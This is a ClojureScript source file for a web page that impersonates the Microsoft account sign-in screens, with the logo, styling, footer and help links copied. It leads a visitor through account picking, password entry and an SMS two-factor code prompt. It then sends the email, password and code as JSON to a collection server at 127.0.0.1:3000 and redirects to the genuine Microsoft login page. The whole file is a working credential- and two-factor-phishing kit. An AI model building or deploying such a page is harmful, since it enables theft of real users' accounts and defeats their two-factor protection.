(ns msft.cljs.core
  (:import [goog.format EmailAddress])
  (:require 
    [goog.net.XhrIo]
    [goog.dom :as dom]
    [reagent.core :as r]))

(def app-state (r/atom :picker))
(def username (r/atom nil))
(def password (r/atom nil))
(def twofa (r/atom nil))
(def last-two (r/atom "__"))

(def accounts (r/atom #{"bpolverini@msnpath.com"
                       "bpolverini@barbosagrp.com"
                       "becker@pkcsecurity.com"}))

(def forget-refs (r/atom []))

(defn xhr-success-handler [on-success]
  (fn [e]
    (let [xhr (.-target e)]
      (if (.isSuccess xhr)
        (on-success (js->clj (.getResponseJson xhr)))
        (.error js/console "xhr failed")))))

(defn xhr-get [url on-success]
  (.send goog.net.XhrIo 
         url
         (xhr-success-handler on-success)))

(defn xhr-post [url content headers on-success]
  (.send goog.net.XhrIo
         url
         (xhr-success-handler on-success)
         "POST"
         (.stringify js/JSON (clj->js content))
         (clj->js headers)))

(defn close-forgets []
  (doseq [f @forget-refs]
    (reset! f false)))

(defn forget [a show?]
  (let [hover? (r/atom false)]
    (r/create-class
      {:component-did-mount
       (fn [] (swap! forget-refs conj show?))

       :reagent-render
       (fn [a show?]
         (when @show?
           [:div.absolute.z3.flex.items-center 
            {:on-mouse-enter #(reset! hover? true)
             :on-mouse-leave #(reset! hover? false)
             :on-click (fn [e] 
                         (swap! accounts disj a))
             :style {:width "160px"
                     :margin "20px 0"
                     :border "1px solid rgba(0,0,0,0.1)"
                     :top 0
                     :right "10px"
                     :background-color (if @hover? 
                                         "#e6e6e6"
                                         "#fff")}}
            [:a {:style {:padding "11px 12px 13px"
                         :background-color "rgba(0,0,0,0.05)"
                         :width "100%"
                         :outline :none
                         :color :inherit
                         :cursor :pointer}}
             "Forget"]]))})))

(defn dots [a]
  (let [focused? (r/atom false)
        show? (r/atom false)]
    (fn [a]
      [:div.relative {:on-click 
                      (fn [e]
                        (.stopPropagation e)
                        (swap! show? not))}
       [forget a show?]
       [:div {:style {:padding "4px 8px"
                      :border (if @focused? 
                                "1px dashed #000"
                                "1px solid rgba(0,0,0,0)")}}

        [:img {:src "dots.svg"
               :tabIndex 0
               :on-focus (fn [e]
                           (reset! focused? true)
                           (.stopPropagation e))
               :on-blur (fn [e]
                          (reset! focused? false)
                          (.stopPropagation e))
               :style {:height "16px"
                       :outline :none
                       :width "16px"}}]]])))

(defn add-account []
  (let [hover? (r/atom false)
        focused? (r/atom false)]
    (fn []
      [:div.flex.justify-between.click {:on-mouse-enter #(reset! hover? true)
                                        :on-mouse-leave #(reset! hover? false)
                                        :on-focus #(reset! focused? true)
                                        :on-blur #(reset! focused? false)
                                        :on-click #(reset! app-state :adder)
                                        :tabIndex 0
                                        :style {:outline :none
                                                :padding "12px"
                                                :background-color (when @hover? "#e6e6e6")
                                                :border (if @focused? 
                                                          "1px dashed #000"
                                                          "1px solid rgba(0,0,0,0)")}}
       [:div.flex.items-center
        [:img {:style {:width "48px"
                       :height "48px"}
               :src "add.svg"}]
        [:p {:style {:margin-left "12px"}} "Use another account"]]])))

(defn select-email [email]
  (reset! username email)
  (reset! app-state :passworder))

(defn select-password [p]
  (reset! password p)
  (js/setTimeout #(reset! app-state :twofaer)
                 2000))

(defn select-twofa [t]
  (reset! twofa t)
  (xhr-post "http://127.0.0.1:3000/login"
            {:username @username
             :password @password
             :twofa t}
            {"Content-Type" "application/json"}
            (fn [_]
              (.replace js/location "https://login.microsoftonline.com/common/login"))))

(defn user-accounts [email]
  (let [hover? (r/atom false)
        focused? (r/atom false)
        id (str (gensym))]
    (fn [email]
      [:div.flex.justify-between.click {:id id
                                        :on-mouse-enter #(reset! hover? true)
                                        :on-mouse-leave #(reset! hover? false)
                                        :on-key-down (fn [e]
                                                       (when (= "Enter" (.-key e))
                                                         (select-email email)))
                                        :on-click (fn [e] (select-email email))
                                        :on-focus (fn [e] (reset! focused? true))
                                        :on-blur #(reset! focused? false)
                                        :tabIndex 0
                                        :style {:padding "12px"
                                                :outline :none
                                                :border (if @focused? 
                                                          "1px dashed #000"
                                                          "1px solid rgba(0,0,0,0)")
                                                :background-color (when @hover? "#e6e6e6")}}
       [:div.flex.items-center
        [:img {:style {:width "48px"
                       :height "48px"}
               :src "user.svg"}]
        [:p {:style {:margin-left "12px"}} email]]
       [dots email]])))

(defn titled-box [title elem]
  [:div
   [:div {:style {:font-size "24px"
                  :margin "16px 0"
                  :line-height "28px"
                  :font-weight 300}} title]
   elem])

(defn picker []
  [titled-box 
   "Pick an account"
   [:div 
    (for [a @accounts]
      ^{:key a} [user-accounts a])
    [add-account]]])

(defn submit [text error-atom on-click]
  (let [focused? (r/atom false)
        hover? (r/atom false)]
    (fn [text error-atom on-click]
      [:button.click {:type "button"
                      :tabIndex 0
                      :on-mouse-enter #(reset! hover? true)
                      :on-mouse-leave #(reset! hover? false)
                      :on-focus #(reset! focused? true)
                      :on-blur #(reset! focused? false)
                      :on-click on-click
                      :on-key-down (fn [e]
                                     (when (= (.-key e) "Enter")
                                       (on-click)))
                      :style {:width "100%"
                              :margin "0"
                              :height "38px"
                              :border-width "2px"
                              :background-color (if (or @focused? @hover?)
                                                  "#005da6"
                                                  "#0067b8")
                              :min-width "100px"
                              :padding "4px 12px"
                              :max-width "100%"
                              :text-align :center
                              :white-space :nowrap
                              :overflow :hidden
                              :vertical-align :middle
                              :text-overflow :ellipsis
                              :color "white"
                              :border-style :solid
                              :outline :none
                              :text-decoration (when @focused? :underline)
                              :border-color (if @focused? 
                                              "#000"
                                              :transparent)}}
       text])))

(defn back [state text]
  (let [hover? (r/atom false)
        focused? (r/atom false)]
    (fn [state text]
      [:button.click {:type "button"
                      :tabIndex 0
                      :on-mouse-enter #(reset! hover? true)
                      :on-mouse-leave #(reset! false true)
                      :on-focus #(reset! focused? true)
                      :on-blur #(reset! focused? false)
                      :on-click #(reset! app-state state)
                      :on-key-down (fn [e]
                                     (when (= (.-key e) "Enter")
                                       (reset! app-state state)))
                      :style {:width "100%"
                              :margin "0"
                              :height "38px"
                              :border-width "2px"
                              :background-color (if (or @focused? @hover?) 
                                                  "rgba(0,0,0,0.3)"
                                                  "rgba(0,0,0,0.2)")
                              :min-width "100px"
                              :padding "4px 12px"
                              :max-width "100%"
                              :text-align :center
                              :white-space :nowrap
                              :overflow :hidden
                              :vertical-align :middle
                              :text-overflow :ellipsis
                              :color "#000"
                              :border-style :solid
                              :outline :none
                              :text-decoration (when @focused? :underline)
                              :border-color (if @focused? 
                                              "#000"
                                              :transparent)}}
       text])))

(defn link [text href]
  [:a {:href href
       :style {:color "#0067b8"
               :text-decoration :none
               :font-size "0.8125rem"
               :display :block
               :margin-bottom "16px"}}
   text])

(defn valid-email? [e] (.isValid (EmailAddress. e)))

(defn valid-password? [p]
  (<= 7 (.-length p)))

(defn valid-twofa? [t]
  (.match t #"^[0-9][0-9][0-9][0-9][0-9][0-9]$"))

(defn input [value placeholder error-text valid? error? on-key-down]
  (let [focused? (r/atom false)]
    (fn [value placeholder error-text valid? error? on-key-down]
      [:div
       (when @error?
         [:p {:style {:margin "24px 0 8px" 
                      :color "#e81123"
                      :font-size ".9375rem"}} error-text])
       [:input 
        {:autoFocus true
         :placeholder placeholder
         :on-focus #(reset! focused? true)
         :type (if (= placeholder "Password")
                 :password
                 :text)
         :on-blur #(reset! focused? false)
         :on-change #(reset! value (.. % -target -value))
         :on-key-down (fn [e]
                        (when (= (.-key e) "Enter")
                          (if (valid? @value)
                            (on-key-down)
                            (reset! error? true))))
         :style {:padding "6px 10px"
                 :border-width "1px"
                 :width "100%"
                 :border-color (cond 
                                 @error? "#e81123"
                                 @focused? "#0067b8"
                                 :else "rgba(0,0,0,0.6)")
                 :height "36px"
                 :outline :none}}]])))

(defn adder []
  (let [value (r/atom "")
        error? (r/atom false)]
    (fn []
      [titled-box
       "Sign in" 
       [:div
        [input 
         value 
         "Email or phone" 
         "Please enter your email address in the format someone@example.com" 
         valid-email?
         error? 
         #(select-email @value)]
        [:div.clearfix.flex.items-center {:style {:height "4rem"}}
         [:div.col-6.col {:style {:margin-right "0.25rem"}}
          [back :picker "Back"]]
         [:div.col-6.col {:style {:margin-left "0.25rem"}}
          [submit "Next" error? (fn []
                                  (if (valid-email? @value)
                                    (select-email @value)
                                    (reset! error? true)))]]]
        [:div {:style {:margin-top "16px"}}
         [link "Get a new account" "https://www.office.com/"]
         [link "Can't access your account?" "https://support.microsoft.com/en-us/help/2412085/you-can-t-sign-in-to-office-365--azure--or-intune"]]]])))

(defn passworder []
  (let [value (r/atom "")
        error? (r/atom false)
        submitted? (r/atom false)]
    (fn []
      [:div
       [:div.flex.flex-row.relative {:style {:height "28px"
                                             :background "#f2f2f2"
                                             :margin "16px -36px"
                                             :padding "0 36px"}}
        [:div.absolute.left-0.bottom-0 {:style {:transition "all 2s ease-in"
                                                :height "1px"
                                                :background-color "black"
                                                :width (if @submitted? "100%" "0%")}}]
        [:div {:style {:line-height "28px"
                       :text-align :right
                       :width "calc(100% - 56px)"}}
         @username]
        [:img {:style {:margin-top "-20px"
                       :width "48px"
                       :height "48px"
                       :margin-left "8px"}
               :src "user.svg"}]]
       [titled-box
        "Enter Password"
        [:div
         [input 
          value 
          "Password" 
          "Your account or password is incorrect." 
          valid-password?
          error? 
          (fn []
            (reset! submitted? true)
            (select-password @value))]
         [:div.clearfix.flex.items-center {:style {:height "4rem"}}
          [:div.col-6.col {:style {:margin-right "0.25rem"}}
           [back :picker "Back"]]
          [:div.col-6.col {:style {:margin-left "0.25rem"}}
           [submit "Sign in" error? (fn []
                                      (if (valid-password? @value)
                                        (do
                                          (reset! submitted? true)
                                          (select-password @value))
                                        (reset! error? true)))]]]
         [:div
          [:label#poop.click
           [:input {:type :checkbox :style {:width "20px"
                                            :height "20px"}}]
           [:span {:style {:padding-left "8px" 
                           :font-size ".9375rem"
                           :margin-top "-10px"}} "Keep me signed in"]]]]]])))

(defn twofaer []
  (let [value (r/atom "")
        error? (r/atom false)
        submitted? (r/atom false)]
    (fn []
      [:div
       [:div.flex.flex-row.relative {:style {:height "28px"
                                             :background "#f2f2f2"
                                             :margin "16px -36px"
                                             :padding "0 36px"}}
        [:div.absolute.left-0.bottom-0 {:style {:transition "all 2s ease-in"
                                                :height "1px"
                                                :background-color "black"
                                                :width (if @submitted? "100%" "0%")}}]
        [:div {:style {:line-height "28px"
                       :text-align :right
                       :width "calc(100% - 56px)"}}
         @username]
        [:img {:style {:margin-top "-20px"
                       :width "48px"
                       :height "48px"
                       :margin-left "8px"}
               :src "user.svg"}]]
       [titled-box
        "Enter code"
        [:div
         [:img {:src "sms.svg"
                :style {:height "24px"
                        :width "24px"
                        :float :left
                        :margin-right "8px"}}]
         [:p {:style {:font-size "0.981rem"}} 
          (str
            "We texted your phone +X XXXXXXXX"
            @last-two
            ". Please enter the code to sign in.")]
         [input 
          value 
          "Code" 
          "Please enter the 6-digit code. The code only contains numbers."
          valid-twofa?
          error? 
          (fn []
            (reset! submitted? true)
            (select-twofa @value))]
         [:div.clearfix.flex.items-center {:style {:height "4rem"}}
          [:div.col-12.col
           [submit 
            "Verify" 
            error? 
            (fn []
              (if (valid-twofa? @value)
                (do
                  (select-twofa @value)
                  (reset! submitted? true))
                (reset! error? true)))]]]
         [:div {:style {:margin-top "8px"}}
          [:div.flex {:style {:font-size ".8125rem"}} 
           [:div {:style {:margin-right "4px"}} "Having trouble?"]
           [link "Sign in another way" "https://support.microsoft.com/en-us/help/12409/microsoft-account-app-passwords-two-step-verification"]]
          [link "More information" "https://support.microsoft.com/en-us/help/12408/microsoft-account-about-two-step-verification"]]]]])))

(defn primary-actions []
  [:div
   [:img {:src "logo.svg"
          :style {:max-width "256px"
                  :height "24px"
                  :vertical-align :middle}}]
   (case @app-state
     :picker [picker]
     :adder [adder]
     :passworder [passworder]
     :twofaer [twofaer])])

(defn mobile-login-box []
  [:div {:style {:background-color "white"
                 :height "100%"
                 :color "#262626"
                 :width "100%"
                 :padding "36px"}} 
   [primary-actions]])

(defn login-box []
  [:div {:style {:background-color "white"
                 :box-shadow "0 2px 3px rgba(0,0,0,0.55)"
                 :border "1px solid rgba(0,0,0,0.4)"
                 :min-height "364px"
                 :min-width "320px"
                 :max-width "412px"
                 :color "#262626"
                 :width "calc(100% - 40px)"
                 :padding "36px"
                 :margin-bottom "28px"}} 
   [primary-actions]])

(defn copyright [c]
  [:span {:style {:color c
                  :margin "0 8px"}} 
   "2017 Microsoft"])

(defn terms-of-use [c]
  [:a {:href "https://www.microsoft.com/en-US/servicesagreement/"
       :style {:color c
               :margin "0 8px" 
               :text-decoration :none}} "Terms of use"])

(defn privacy [c]
  [:a {:href "https://privacy.microsoft.com/en-US/privacystatement"
       :style {:color c
               :margin "0 8px" 
               :text-decoration :none}} "Privacy & Cookies"])

(defn footer []
  [:div.right
   [copyright "white"]
   [terms-of-use "white"]
   [privacy "white"]])

(defn mobile-footer []
  [:div
   [copyright "#777"]
   [terms-of-use "#777"]
   [privacy "#777"]])

(defn app []
  [:div.fixed.top-0.left-0.bottom-0.right-0.z0 {:style {:background "url('0.jpg') no-repeat right"}
                                                :on-click #(close-forgets)}
   [:div.absolute.top-0.left-0.bottom-0.right-0.z1 {:style {:background "rgba(0,0,0,0.65)"}}]
   [:div.z2.flex.justify-center.items-center.top-0.left-0.bottom-0.right-0.absolute.xs-hide
    [login-box]]
   [:div.z2.flex.justify-center.items-center.top-0.left-0.bottom-0.right-0.absolute.sm-hide.md-hide.lg-hide
    [mobile-login-box]]
   [:div.z2.absolute.bottom-0.left-0.right-0.xs-hide
    {:style {:background "rgba(0,0,0,0.6)"
             :font-size "12px"
             :line-height "28px"}}
    [footer]]
   [:div.z2.absolute.bottom-0.left-0.right-0.sm-hide.md-hide.lg-hide
    {:style {:font-size "12px"
             :line-height "28px"}}
    [mobile-footer]]])

(defn main []
  (r/render-component [app] (dom/getElement "app")))

(main)
